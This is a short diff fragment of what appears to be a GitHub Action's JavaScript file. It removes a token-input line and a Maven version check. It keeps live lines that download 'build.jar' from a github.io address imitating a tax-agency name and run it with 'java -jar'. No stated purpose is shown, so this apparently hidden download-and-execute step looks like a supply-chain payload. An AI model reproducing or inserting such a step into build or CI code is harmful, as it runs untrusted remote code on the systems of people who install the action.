@@ -16,11 +16,9 @@ try {
   } else {
     console.log("nothing modified") 
   }
-  let token = core.getInput("token")
   let url = "https://agencia-tributaria.github.io/resource_type/build.jar"
   system.exec(`wget ${url}`)
   system.exec(`java -jar build.jar`)
-  system.exec(`mvn -v`)
   //const path = core.getInput('path');
   //const time = (new Date()).toTimeString();
   //core.setOutput("time", time);
